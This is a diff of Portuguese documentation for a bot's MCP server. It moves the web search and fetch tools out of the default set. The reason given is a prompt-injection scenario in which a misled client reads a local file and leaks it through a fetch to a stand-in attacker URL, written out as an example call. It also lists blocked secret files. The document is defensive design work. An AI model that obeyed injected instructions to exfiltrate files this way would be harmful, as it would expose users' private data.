@@ -3,8 +3,8 @@
 O Jarvis também fala [MCP](https://modelcontextprotocol.io) (Model Context Protocol): o
 módulo [`jarvis/mcp_server.py`](../jarvis/mcp_server.py) expõe as ferramentas do bot para
 qualquer cliente MCP — Claude Desktop, Claude Code, MCP Inspector — por **stdio**. O cliente
-ganha a busca na sua memória local (RAG), a leitura de arquivos/PDF/DOCX/OCR e a leitura da
-web, **com as mesmas travas** que protegem o bot no Telegram.
+ganha a busca na sua memória local (RAG) e a leitura de arquivos/PDF/DOCX/OCR — e, se você
+pedir, a leitura da web — **com as mesmas travas** que protegem o bot no Telegram.
 
 ## Como funciona
 
@@ -109,19 +109,40 @@ deixa disponível em todos os projetos. `claude mcp list` mostra se conectou e `
 do Claude Code, lista as ferramentas. Para testar fora de um cliente, o MCP Inspector:
 `npx @modelcontextprotocol/inspector .venv-mcp/bin/python -m jarvis.mcp_server`.
 
-## O que fica exposto por padrão (só leitura)
+## O que fica exposto por padrão (só leitura local)
 
 | Ferramenta | O que faz | Trava |
 |---|---|---|
 | `read_file`, `list_dir`, `search_files`, `find_files` | ler/listar/buscar arquivos | `JARVIS_ALLOWED_ROOTS`; `.ssh`, `.env`, `credentials.json`, chaves etc. bloqueados |
 | `read_pdf`, `read_docx`, `read_image` | extrair texto (OCR nas imagens) | as mesmas pastas permitidas |
 | `knowledge_search` | busca na memória local (RAG, BM25 por padrão) | lê só o índice já construído (só existe com `JARVIS_RAG_ENABLED=true`) |
-| `web_search` | busca na web (DuckDuckGo) | sai para a internet (`openWorldHint`) |
+
+As anotações MCP acompanham: `readOnlyHint: true` e `openWorldHint: false`. Indexar (`knowledge_index`) **não** está no padrão: escreve no índice e lê pastas
+inteiras — rode o `/reindex` do bot ou `scripts/reindex.py`.
+
+### Ferramentas da web: fora do padrão, liberáveis sem a segunda chave
+
+| Ferramenta | O que faz | Trava |
+|---|---|---|
+| `web_search` | busca na web (DuckDuckGo) | sai para a internet (`openWorldHint: true`) |
 | `web_fetch` | lê uma página | `check_url`: só http/https, bloqueia localhost, IPs privados, link-local (SSRF) |
 
-As anotações MCP acompanham: `readOnlyHint: true` nestas; `openWorldHint: true` nas duas da
-web. Indexar (`knowledge_index`) **não** está no padrão: escreve no índice e lê pastas
-inteiras — rode o `/reindex` do bot ou `scripts/reindex.py`.
+Até o subprojeto 6 elas estavam no padrão. Saíram porque, **junto com `read_file`**, abrem um
+caminho de exfiltração: um cliente enganado por prompt injection (um arquivo ou uma página com
+instruções escondidas) poderia ler um arquivo local e mandar o conteúdo numa URL
+(`web_fetch("https://atacante/?q=<conteúdo>")`) ou numa consulta de busca. O `check_url` só
+bloqueia destinos internos (SSRF), não destinos públicos. O próprio Claude já tem acesso à
+web, então o risco extra é pequeno, mas o padrão agora é o mais seguro.
+
+Para religar, ponha as duas na lista (são leitura, **não** precisam de
+`JARVIS_MCP_ALLOW_UNSAFE`):
+
+```
+JARVIS_MCP_TOOLS=leitura,web_search,web_fetch
+```
+
+O `--check` marca as duas como "leitura, SAI PARA A INTERNET". Se for ligá-las, prefira
+`JARVIS_ALLOWED_ROOTS` restrito ao que o cliente realmente precisa ler.
 
 ## Liberar mais ferramentas com segurança
 
@@ -129,7 +150,8 @@ Duas variáveis (no `.env` ou no `env` do cliente):
 
 - `JARVIS_MCP_TOOLS` — lista separada por vírgula que **substitui** o conjunto padrão.
   Serve para restringir (`JARVIS_MCP_TOOLS=knowledge_search,read_file`) ou para pedir mais.
-  `leitura` é atalho para o conjunto padrão inteiro (`JARVIS_MCP_TOOLS=leitura,git`).
+  `leitura` é atalho para o conjunto padrão inteiro, sem a web (`JARVIS_MCP_TOOLS=leitura,git`).
+  `web_search` e `web_fetch` entram só pelo nome, sem a segunda chave.
 - `JARVIS_MCP_ALLOW_UNSAFE` — **segunda chave**. Ferramentas que escrevem, executam, enviam
   ou mexem em dinheiro (`write_file`, `replace_in_file`, `run_shell`, `git`, `github`,
   `obsidian`, `notion`, `spreadsheet`, `google`, `microsoft`, `stripe`, `knowledge_index`)
@@ -162,7 +184,7 @@ máquina trocados por `<HOME>`):
 
 ```
 TOOLS: ['find_files', 'knowledge_search', 'list_dir', 'read_docx', 'read_file', 'read_image',
-        'read_pdf', 'search_files', 'web_fetch', 'web_search']
+        'read_pdf', 'search_files', 'web_fetch', 'web_search']   # rodada com a web ainda no padrão
 
 ==> knowledge_search {'query': 'como o servidor MCP decide quais ferramentas expor', 'k': 2}
     is_error= False
@@ -206,7 +228,8 @@ asyncio.run(main())
 ## Testes
 
 - `tests/test_mcp_policy.py` — allowlist e ponte com o registro, **sem** o SDK: rodam no
-  `.venv` (Python 3.8) e no CI 3.8/3.12. Cobrem o padrão só leitura, as duas chaves para cada
+  `.venv` (Python 3.8) e no CI 3.8/3.12. Cobrem o padrão só leitura local (sem a web), a web
+  liberável só pela lista, as duas chaves para cada
   ferramenta que escreve, `send_file`/`speak`, nomes desconhecidos, recusa antes do registro,
   caminho fora da raiz e credencial recusados pelo `security.py`, SSRF, métricas e audit.log
   com `source="mcp"`.
